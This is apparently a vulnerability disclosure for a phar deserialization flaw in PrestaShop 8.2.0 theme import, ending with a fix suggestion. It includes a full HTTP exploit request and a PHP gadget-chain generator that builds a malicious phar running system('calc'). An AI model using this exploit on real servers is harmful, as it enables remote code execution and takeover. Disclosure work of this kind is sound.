# `phar` deserialization vulnerability `ThemeManager.php#install` function

## 0x01 Affected version
vendor: https://github.com/PrestaShop/PrestaShop

version: 8.2.0

php version: 7.x

## 0x02 Vulnerability description
In PHP, the `Phar file format` is an archive format used to package and distribute PHP applications. This format allows multiple files, directories, and metadata to be bundled into a single file. However, the Phar format contains a deserialization vulnerability that allows an attacker to trigger the deserialization vulnerability by crafting a malicious Phar file. This vulnerability typically occurs when deserializing user input without filtering, allowing the attacker to control the contents of the deserialized object and execute arbitrary code.

Specifically, an attacker can exploit this vulnerability by creating a malicious Phar file and uploading it to a vulnerable PHP server. By triggering the `phar://` protocol, the attacker can read and deserialize the data from the file. The deserialization process can lead to the execution of arbitrary PHP code, allowing the attacker to remotely execute code, retrieve sensitive information, or perform other malicious actions.

The severity of this vulnerability lies in its ability to allow unauthorized remote code execution, enabling an attacker to fully compromise the system, further manipulate the server, or steal sensitive data.

In `PrestaShop v8.2.0`, within the ThemeManager.php#install function, the `Tools::createFileFromUrl($source)` method is used. When `$source='phar://**'`, remote attackers can achieve remote code execution.The fopen function is a key method that triggers the Phar deserialization vulnerability.
![alt text](image.png)
![alt text](image-1.png)
![alt text](image-2.png)
![alt text](image-3.png)
![alt text](image-5.png)
![alt text](image-4.png)

```text
POST /admin/index.php/improve/design/themes/import?_token=btRUtV2Om2noliZZjeFQZhlMY3gYivjABbPOjP91L6U HTTP/1.1
Host: dem0.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.361f4552ca645f09670605c24f64aab67ce010c716dfd8de67d8c23995a9f813b9c9d9522ef6a53cca057b382e1ddc4b905c047278b01b0db00aedfa874ab300fea74f3bf5429318175df9f58a
Upgrade-Insecure-Requests: 1
Origin: http://dem0.com
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarymCmlvIUBBYzfgX27
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Connection: keep-alive
Referer: http://dem0.com/admin/index.php/improve/design/themes/import?_token=btRUtV2Om2noliZZjeFQZhlMY3gYivjABbPOjP91L6U
Cache-Control: max-age=0
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Content-Length: 613

------WebKitFormBoundarymCmlvIUBBYzfgX27
Content-Disposition: form-data; name="import_theme[import_from_computer]"; filename=""
Content-Type: application/octet-stream


------WebKitFormBoundarymCmlvIUBBYzfgX27
Content-Disposition: form-data; name="import_theme[import_from_web]"

phar://a.phar
------WebKitFormBoundarymCmlvIUBBYzfgX27
Content-Disposition: form-data; name="import_theme[import_from_ftp]"


------WebKitFormBoundarymCmlvIUBBYzfgX27
Content-Disposition: form-data; name="import_theme[_token]"

JCqVFyt2RSudDG1eq5x6B9yqjL_QhsRLqCas-brD3xA
------WebKitFormBoundarymCmlvIUBBYzfgX27--

```

### POC generate code

```php
<?php
namespace Monolog\Handler{
    interface HandlerInterface
    {}
    interface ResettableInterface
    {
    }
    abstract class AbstractHandler implements HandlerInterface, ResettableInterface
    {
        protected $level = 1;
        protected $bubble = true;
        protected $formatter;
        protected $processors = array();
    }
    class FingersCrossedHandler extends AbstractHandler {
        protected $handler;
        protected $activationStrategy;
        protected $buffering = true;
        protected $bufferSize;
        protected $buffer = array();
        protected $stopBuffering;
        protected $passthruLevel;

        public function __construct($handler){
            $this->passthruLevel = 0;
            $this->buffer = array(
                "a"=>array(
                    "level"=>100
                )
            );
            $this->handler = $handler;
            // $this->handler =
        }
    }
}


namespace Doctrine\ORM\Mapping{
    interface ClassMetadata{}
    class ClassMetadataInfo implements ClassMetadata
    {
        public const INHERITANCE_TYPE_NONE = 1;
        public const INHERITANCE_TYPE_JOINED = 2;
        public const INHERITANCE_TYPE_SINGLE_TABLE = 3;
        public const INHERITANCE_TYPE_TABLE_PER_CLASS = 4;
        public const GENERATOR_TYPE_AUTO = 1;
        public const GENERATOR_TYPE_SEQUENCE = 2;
        public const GENERATOR_TYPE_TABLE = 3;
        public const GENERATOR_TYPE_IDENTITY = 4;
        public const GENERATOR_TYPE_NONE = 5;
        public const GENERATOR_TYPE_UUID = 6;
        public const GENERATOR_TYPE_CUSTOM = 7;
        public const CHANGETRACKING_DEFERRED_IMPLICIT = 1;
        public const CHANGETRACKING_DEFERRED_EXPLICIT = 2;
        public const CHANGETRACKING_NOTIFY = 3;
        public const FETCH_LAZY = 2;
        public const FETCH_EAGER = 3;
        public const FETCH_EXTRA_LAZY = 4;
        public const ONE_TO_ONE = 1;
        public const MANY_TO_ONE = 2;
        public const ONE_TO_MANY = 4;
        public const MANY_TO_MANY = 8;
        public const TO_ONE = 3;
        public const TO_MANY = 12;
        public const CACHE_USAGE_READ_ONLY = 1;
        public const CACHE_USAGE_NONSTRICT_READ_WRITE = 2;
        public const CACHE_USAGE_READ_WRITE = 3;
        public const GENERATED_NEVER = 0;
        public const GENERATED_INSERT = 1;
        public const GENERATED_ALWAYS = 2;
        public $name;
        public $namespace;
        public $rootEntityName;
        public $customGeneratorDefinition;
        public $customRepositoryClassName;
        public $isMappedSuperclass = false;
        public $isEmbeddedClass = false;
        public $parentClasses = [];
        public $subClasses = [];
        public $embeddedClasses = [];
        public $namedQueries = [];
        public $namedNativeQueries = [];
        public $sqlResultSetMappings = [];
        public $identifier = [];
        public $inheritanceType = self::INHERITANCE_TYPE_NONE;
        public $generatorType = self::GENERATOR_TYPE_NONE;
        public $fieldMappings = [];
        public $fieldNames = [];
        public $columnNames = [];
        public $discriminatorValue;
        public $discriminatorMap = [];
        public $discriminatorColumn;
        public $table;
        public $lifecycleCallbacks = [];
        public $entityListeners = [];
        public $associationMappings = [];
        public $isIdentifierComposite = false;
        public $containsForeignIdentifier = false;
        public $containsEnumIdentifier = false;
        public $idGenerator;
        public $sequenceGeneratorDefinition;
        public $tableGeneratorDefinition;
        public $changeTrackingPolicy = self::CHANGETRACKING_DEFERRED_IMPLICIT;
        public $requiresFetchAfterChange = false;
        public $isVersioned = false;
        public $versionField;
        public $cache;
        public $reflClass;
        public $isReadOnly = false;
        protected $namingStrategy;
        public $reflFields = [];
        private $instantiator;
        public function __construct($handler,$code){
            $this->instantiator = $handler;
            $this->name = $code;
        }
    }
}
namespace {
    ini_set("display_errors", "On");
    ini_set("error_reporting",E_ALL);
    class SmartyLazyRegister
    {
        protected $registry = [];
        protected static $instances = [];
        public function __construct($func){
            $this->registry["instantiate"] = $func;

        }
    }
    $func = "system";
    $code = "calc";
    $lazy = new SmartyLazyRegister($func);
    $meatinfo = new Doctrine\ORM\Mapping\ClassMetadataInfo($lazy,$code);
    $handler = array($meatinfo,"newInstance");

    $FingersCrossedHandler = new Monolog\Handler\FingersCrossedHandler($handler);
    $phar = new Phar("exp.phar"); 
    $phar->startBuffering();
    $phar->setStub('<?php __HALT_COMPILER(); ?>'); 
    $phar->setMetadata($FingersCrossedHandler);
    $phar->addFromString("exp.txt", "test"); 
    $phar->stopBuffering();

    echo base64_encode(serialize($FingersCrossedHandler));
}
```
When we pass a remote link as a parameter to the `createFileFromUrl` function, the file will be downloaded to the `admin` directory. By leveraging this, we can transmit a malicious Phar file, thus exploiting the vulnerability and achieving remote code execution.

## 0x03 Repair suggestions
To prevent the exploitation of this vulnerability, it is important to ensure that the URLs passed to createFileFromUrl are valid and only allow the `HTTP` or `HTTPS` protocols. Malicious attackers may attempt to pass URLs using other protocols, such as `phar://`, which could trigger the deserialization vulnerability. Proper validation and filtering of URLs are critical for mitigating this risk.

